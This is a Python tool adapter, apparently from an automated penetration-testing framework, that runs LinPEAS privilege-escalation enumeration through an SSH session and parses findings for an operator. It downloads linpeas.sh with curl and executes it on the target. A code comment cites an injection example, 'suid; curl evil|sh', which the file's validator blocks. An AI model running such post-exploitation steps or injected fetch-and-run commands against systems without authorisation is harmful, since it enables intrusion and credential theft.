"""LinPEAS adapter — Linux privilege-escalation enumeration via an open session.

In-session execution. Requires a `Session` of type=ssh
already opened by `SessionManager.open_ssh`. Pulls the linpeas script from
the sandbox image and exec's it through the session.

Output is the linpeas report — parsed for sections matching common privesc
vectors and emitted as candidate Findings for the operator to triage.
"""

from __future__ import annotations

import re
from datetime import UTC
from typing import ClassVar
from uuid import UUID

from pydantic import BaseModel, Field, field_validator

# linpeas section selectors are interpolated into the `-o {sections}` shell
# command shipped over the session. Restrict each element to a strict
# lowercase-identifier alphabet so a value like `suid; curl evil|sh` can't
# inject a second command (sandbox-05).
_SECTION_RE = re.compile(r"^[a-z_]{1,32}$")

from sandbox.sessions import get_session_manager
from tools._helpers import iso
from tools.base import Tool, ToolResult, ToolRunContext
from worldstate.schema import RiskClass, Stage


class LinPEASInput(BaseModel):
    session_id: str = Field(min_length=1, description="Open Session UUID")
    sections: list[str] = Field(
        default_factory=lambda: ["suid", "sudo", "kernel", "cron"],
        description="linpeas sections to scan (passes through linpeas -o)",
    )
    timeout_seconds: int = Field(default=600, ge=30, le=3600)

    @field_validator("sections")
    @classmethod
    def _check_sections(cls, v: list[str]) -> list[str]:
        for s in v:
            if not _SECTION_RE.match(s):
                raise ValueError(
                    f"section {s!r} is invalid; each section must match "
                    "^[a-z_]+$ (no shell metacharacters)"
                )
        return v


class LinPEASFinding(BaseModel):
    section: str
    severity: str  # "red", "yellow", "info"
    detail: str
    raw_excerpt: str


class LinPEASOutput(BaseModel):
    findings: list[LinPEASFinding] = Field(default_factory=list)
    raw_blob_id: str | None = None
    sections_scanned: list[str]
    exit_code: int


class LinPEAS(Tool[LinPEASInput, LinPEASOutput]):
    name = "linpeas"
    description = (
        "Run linpeas inside an open SSH session and parse for privesc "
        "candidates. Use after a Session has been opened on a Linux host."
    )
    stage = Stage.PRIVESC
    risk_class = RiskClass.POST_EXPLOIT
    Input: ClassVar[type[BaseModel]] = LinPEASInput
    Output: ClassVar[type[BaseModel]] = LinPEASOutput

    def extract_targets(self, input: LinPEASInput) -> list[str]:
        # The Session already gated the target at open-time; the session
        # itself is internal infrastructure.
        return []

    def summarize_for_model(
        self, output: LinPEASOutput, *, tool_run_id: UUID, persisted: int
    ) -> str:
        # do NOT inline finding `detail` strings. linpeas
        # extracts content from world-readable files (.htpasswd, mysql
        # config, ssh authorized_keys, /etc/passwd, history files, etc.)
        # and embeds matched text into [+] detail lines — the field
        # routinely contains plaintext credentials and private keys. The
        # planner gets section/severity counts; the full text lives in
        # the LinPEASFinding records (scrubbed at evidence-put time) and
        # the raw_blob_id for operator review.
        sev_counts: dict[str, int] = {}
        sect_counts: dict[str, int] = {}
        for f in output.findings:
            sev_counts[f.severity] = sev_counts.get(f.severity, 0) + 1
            sect_counts[f.section] = sect_counts.get(f.section, 0) + 1
        sev_str = ", ".join(f"{k}={v}" for k, v in sev_counts.items()) or "none"
        sect_str = ", ".join(
            f"{k}={v}" for k, v in sorted(sect_counts.items(), key=lambda kv: -kv[1])[:4]
        ) or "none"
        red_count = sev_counts.get("red", 0)
        red_sections = sorted(
            {f.section for f in output.findings if f.severity == "red"}
        )[:4]
        red_section_str = (
            f" red_sections=[{', '.join(red_sections)}]" if red_sections else ""
        )
        summary = (
            f"{self.name}: scanned={','.join(output.sections_scanned)}, "
            f"exit={output.exit_code}, findings={len(output.findings)} "
            f"(by sev: {sev_str}) (by sect: {sect_str}). "
            f"red_findings={red_count}{red_section_str} "
            f"(detail bodies redacted from planner context). "
            f"persisted={persisted}. tool_run_id={tool_run_id}"
        )
        if len(summary) > 500:
            summary = summary[:485] + "... [truncated]"
        return summary

    async def run(self, input: LinPEASInput, ctx: ToolRunContext) -> ToolResult[LinPEASOutput]:
        from datetime import datetime

        started = datetime.now(UTC)
        mgr = get_session_manager()
        # `linpeas.sh` is shipped in the sandbox image at /opt/linpeas.sh
        # (or fetched on-demand if missing).
        sections = ",".join(input.sections)
        command = (
            "if [ ! -f /tmp/linpeas.sh ]; then "
            "curl -fsSLo /tmp/linpeas.sh "
            "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh && "
            "chmod +x /tmp/linpeas.sh; fi; "
            f"bash /tmp/linpeas.sh -a -o {sections}"
        )
        try:
            result = await mgr.exec(
                UUID(input.session_id),
                command,
                timeout_seconds=input.timeout_seconds,
            )
        except (KeyError, NotImplementedError):
            ended = datetime.now(UTC)
            return ToolResult(
                tool_run_id=ctx.tool_run_id,
                name=self.name,
                output=LinPEASOutput(
                    findings=[],
                    sections_scanned=input.sections,
                    exit_code=1,
                ),
                exit_code=1,
                started_at=iso(started),
                ended_at=iso(ended),
            )

        # Best-effort persist the full transcript as evidence.
        blob_id: str | None = None
        from orchestrator.evidence import EvidenceStore
        from orchestrator.settings import get_settings

        try:
            store = EvidenceStore(get_settings())
            bid, _sha = store.put(
                result.stdout.encode("utf-8", errors="replace"),
                engagement_id=ctx.engagement_id,
                kind=f"{self.name}/transcript",
            )
            blob_id = str(bid)
        except Exception:
            pass

        findings = _parse_linpeas(result.stdout, input.sections)
        ended = datetime.now(UTC)
        return ToolResult(
            tool_run_id=ctx.tool_run_id,
            name=self.name,
            output=LinPEASOutput(
                findings=findings,
                raw_blob_id=blob_id,
                sections_scanned=input.sections,
                exit_code=result.exit_code,
            ),
            raw_stdout_blob_id=UUID(blob_id) if blob_id else None,
            exit_code=result.exit_code,
            started_at=iso(started),
            ended_at=iso(ended),
        )


# linpeas highlights findings with colour-coded markers. The relevant ones:
#   95% RED ============= = high-confidence privesc
#   95% YELLOW =========== = likely interesting
# After ANSI stripping, RED lines often contain "[+]" + capital headings.
_ANSI = re.compile(r"\x1b\[[0-9;]*m")
_RED_HIT = re.compile(r"\[\+\]\s*([A-Za-z][\w \-]*?):\s*(.+)", re.MULTILINE)


def _parse_linpeas(text: str, sections: list[str]) -> list[LinPEASFinding]:
    cleaned = _ANSI.sub("", text)
    out: list[LinPEASFinding] = []
    for m in _RED_HIT.finditer(cleaned):
        section_label = m.group(1).strip().lower().replace(" ", "_")
        detail = m.group(2).strip()
        # Section filter: keep only what the caller asked for
        if not any(s in section_label for s in sections):
            continue
        excerpt_start = max(0, m.start() - 100)
        excerpt = cleaned[excerpt_start : m.end() + 200]
        out.append(
            LinPEASFinding(
                section=section_label,
                severity="red",
                detail=detail[:500],
                raw_excerpt=excerpt[:1000],
            )
        )
    return out
